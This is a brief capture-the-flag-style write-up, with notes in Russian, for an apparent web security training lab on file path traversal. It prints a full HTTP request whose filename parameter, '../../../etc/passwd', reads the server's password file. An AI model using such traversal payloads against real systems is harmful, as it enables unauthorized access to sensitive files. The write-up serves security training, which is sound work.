# File path traversal, simple case
APPRENTICE

This lab contains a path traversal vulnerability in the display of product images.

To solve the lab, retrieve the contents of the /etc/passwd file.

## Решение
Target -> Filter: Showing all items.

Отлавливаю запрос одной из картинок. Пробую в качестве значения параметра filename подставить `/etc/passwd`, последовательно добавляя ".." в начало пути до тех пор, пока запрос не вернёт содержимое файла "/etc/passwd":
```
GET /image?filename=../../../etc/passwd HTTP/2
Host: 0a7400a6036382d98245abec005c0058.web-security-academy.net
Cookie: session=BTgywuizXrsk2shuefe5lnEgf6bzjRJ4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a7400a6036382d98245abec005c0058.web-security-academy.net/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Pragma: no-cache
Cache-Control: no-cache
Te: trailers
```
Задание выполнено.
